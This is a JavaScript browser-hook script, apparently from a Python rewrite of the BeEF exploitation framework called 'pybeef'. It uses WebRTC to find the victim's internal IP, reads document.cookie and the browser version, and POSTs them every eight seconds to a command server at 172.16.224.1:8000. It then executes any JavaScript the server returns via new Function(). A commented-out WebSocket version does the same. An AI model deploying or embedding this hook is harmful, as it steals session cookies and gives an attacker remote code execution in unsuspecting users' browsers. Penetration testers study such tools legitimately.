/*
function hasWebsocket(){
    return !!window.WebSocket || !!window.MozWebSocket;
}
if (hasWebsocket()){
    try{
    var ws = new WebSocket("ws://localhost:8000/ws");
    }
    catch(err){
        console.log("no WebSocket server ") 
    }
    ws.onopen = function(){
        console.log("socket open");
        ws.send("give me some command");
    }
    ws.onmessage = function(msg){
        f = new Function(msg.data);
        f();
        console.log("command executed")
    }
}
else{
    console.log("no WebSocket")
}
*/

// 轮循服务器

var xmlhttp;
if (window.XMLHttpRequest){
	xmlhttp = new XMLHttpRequest();
}
else if (window.ActiveObject){
	xmlhttp = new ActiveObject("Msxml12.XMLHTTP");
}

function Makerequest(url){
        if (xmlhttp!=null){
          xmlhttp.onreadystatechange=state_Change;
          xmlhttp.open("POST",url,true);
          xmlhttp.withCredentials = true;   //设置cookie必须带上这个参数
          xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
          xmlhttp.send("&IP="+IP+"&cookies="+browser_details['Cookies']+"&version="+browser_details['version']);
          }
    }

function state_Change(){
if (xmlhttp.readyState==4){
    if(xmlhttp.responseText!=''){
        f = new Function(xmlhttp.responseText);
        f();
        //document.getElementById("xhr").innerhtml = xmlhttp.responseText;
        }
    else{
        console.log("responseText wrong");
    }
  }
}

//产生随机数作为浏览器的标识
/*
function randomChar(l){
var  x="0123456789qwertyuioplkjhgfdsazxcvbnm";
var  tmp="";
var timestamp = new Date().getTime();
for(var  i=0;i<  l;i++)  {
tmp  +=  x.charAt(Math.ceil(Math.random()*100000000)%x.length);
}
return  tmp.toUpperCase();
}

if (hook_id){;}
else{
	var hook_id = randomChar(32);
}
*/


setInterval('Makerequest("http://172.16.224.1:8000/poll")',8000);
//Makerequest("http://localhost:8000/poll?hook_id="+hook_id);



////WEBRTC  get internal IP Address

// NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
var IP;
if (RTCPeerConnection) (function () {
    var rtc = new RTCPeerConnection({iceServers:[]});
    if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
        rtc.createDataChannel('', {reliable:false});
    };
    
    rtc.onicecandidate = function (evt) {
        // convert the candidate to SDP so we can run it through our general parser
        // see https://twitter.com/lancestout/status/525796175425720320 for details
        if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
    };
    rtc.createOffer(function (offerDesc) {
        grepSDP(offerDesc.sdp);
        rtc.setLocalDescription(offerDesc);
    }, function (e) { console.warn("offer failed", e); });
    
    
    var addrs = Object.create(null);
    addrs["0.0.0.0"] = false;
    function updateDisplay(newAddr) {
        if (newAddr in addrs) return;
        else addrs[newAddr] = true;
        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
//        document.getElementById('list').textContent = displayAddrs.join(" or perhaps ") || "n/a";
        IP = displayAddrs.join(" or ") || "n/a";
    }
    
    function grepSDP(sdp) {
        var hosts = [];
        sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
            if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
                var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
                    addr = parts[4],
                    type = parts[7];
                if (type === 'host') updateDisplay(addr);
            } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
                var parts = line.split(' '),
                    addr = parts[2];
                updateDisplay(addr);
            }
        });
    }
})(); else {
//    document.getElementById('list').innerHTML = "<code>ifconfig | grep inet | grep -v inet6 | cut -d\" \" -f2 | tail -n1</code>";
//    document.getElementById('list').nextSibling.textContent = "In Chrome and Firefox your IP should display automatically, by the power of WebRTCskull.";
;
}
if(typeof pybeef === "undefined" && typeof window.pybeef === "undefined"){
	var pybeef = {
		version : "1.0",
		//要执行的命令
		commands : new Array(),
		//
		components : new Array(),

		execute : function(fn) {
			if( typeof pybeef.websocket == "undefined"){
				this.commands.push(fn);
			}
			else{
				fn();
			}
		},

		regcmp : function(component){
			this.components.push(component);
		}
	};
}
pybeef.browser = {

    isFF : function(){
    	return window.navigator.userAgent.match(/Firefox\/.+/)!=null;
    },

    isIE6: function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },


    isIE7: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    isIE8: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    isIE9: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },


    isIE10: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },


    isIE11: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },
    
    isIEedge: function() {
        return !!window.XMLHttpRequest && !!window.chrome && !window.opera && !document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints == "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },

    isIE: function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11() || this.isIEedge();
    },


	getBrowserVersion: function(){
		var FF = window.navigator.userAgent.match(/Firefox\/.+/); 
		if(this.isFF()){ return FF;}
		if(this.isIE6()){ return "IE6";}
		if(this.isIE7()){ return "IE7";}
		if(this.isIE8()){ return "IE8";}
		if(this.isIE9()){ return "IE9";}
		if(this.isIE10()){ return "IE10";}
		if(this.isIE11()){ return "IE11";}
        if(this.isIEedge()){return "IEedge";}
//		if(this.isIEedge()){ return "IE edge";}		
		},

    hasWebSocket: function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },
    
    hasWebRTC: function () {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    getBrowserDetails:function(){
 		var details = new Array();
 		var browser_version = this.getBrowserVersion();
 		if(browser_version){ details['version'] = browser_version ;}
 		try{
            var cookies = document.cookie;
            if (cookies) details['Cookies'] = cookies;
        } catch (e) {
            details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
        }
    
    	return details;
    }
};
var browser_details = pybeef.browser.getBrowserDetails();
pybeef.regcmp('pybeef.browser');